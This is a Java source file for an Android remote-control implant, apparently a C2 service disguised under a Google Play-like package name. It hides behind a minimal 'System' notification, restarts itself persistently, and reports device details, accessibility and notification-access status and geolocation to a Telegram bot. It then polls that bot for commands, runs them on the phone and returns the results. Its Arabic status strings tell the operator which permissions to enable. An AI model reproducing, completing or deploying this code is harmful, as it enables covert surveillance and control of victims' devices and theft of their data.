package com.android.vending.helper;
import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.util.concurrent.atomic.AtomicLong;
public class C2Service extends Service {
    private final AtomicLong offset = new AtomicLong(0);
    private volatile boolean running = true;
    @Override public void onCreate() {
        super.onCreate();
        
        String ch = "sys";
        NotificationChannel nc = new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN);
        nc.setShowBadge(false);
        nc.setSound(null, null);
        nc.enableVibration(false);
        getSystemService(NotificationManager.class).createNotificationChannel(nc);
        Notification n = new NotificationCompat.Builder(this, ch).setContentTitle("Service").setContentText("Running").setSmallIcon(android.R.drawable.ic_menu_manage).build();
        startForeground(1, n);
        new Thread(this::announce).start(); new Thread(this::poll).start();
    }
    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    void announce() { 
        String accStatus = Sys.isAccessibilityEnabled(this) ? "[✓] إمكانية الوصول: مفعلة" : "[✗] إمكانية الوصول: معطلة (اذهب لـ الإعدادات > إمكانية الوصول)";
        String notifStatus = isNotifListenerEnabled() ? "[✓] الإشعارات: مفعلة" : "[✗] الإشعارات: معطلة (اذهب لـ الإعدادات > الإشعارات > الوصول إلى الإشعارات)";
        Tg.sendSilent(Dev.tag(this) + "متصل الآن | " + Dev.desc(this) + "\n" + accStatus + "\n" + notifStatus + "\n" + Meta.geo());
        Tg.sendKeyboard(Dev.tag(this) + "لوحة التحكم جاهزة", Dev.id(this)); 
    }
    
    private boolean isNotifListenerEnabled() {
        try {
            String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            return flat != null && flat.contains(getPackageName());
        } catch (Exception e) { return false; }
    }
    void poll() {
        while (running) {
            try {
                JSONArray arr = Tg.getUpdates(offset.get());
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject up = arr.getJSONObject(i); offset.set(up.getLong("update_id") + 1);
                    JSONObject m = up.optJSONObject("message"); JSONObject cb = up.optJSONObject("callback_query");
                    String target = "", body = "";
                    if (cb != null) {
                        Tg.answerCallback(cb.getString("id")); String[] parts = cb.getString("data").split("_", 2);
                        target = parts[0]; body = parts.length > 1 ? parts[1] : "";
                    } else if (m != null) {
                        if (!m.getJSONObject("chat").getString("id").equals(Cfg.getChat())) continue;
                        String text = m.optString("text", "").trim(); if (text.isEmpty()) continue;
                        String[] parts = text.split("\\s+", 2); target = parts[0]; body = parts.length > 1 ? parts[1] : "";
                    } else continue;
                    if (target.equals("all") || target.equals("me") || target.equals(Dev.id(this))) {
                        final String finalBody = body;
                        new Thread(() -> {
                            String out = Cmd.run(this, finalBody);
                            if (!out.startsWith("PHOTO_SENT") && !out.equals("WA_LINK_STARTED")) { Tg.sendSilent(Dev.tag(this) + out); }
                        }).start();
                    }
                }
            } catch (Exception e) { try { Thread.sleep(1000); } catch (InterruptedException ignored) {} }
        }
    }
}
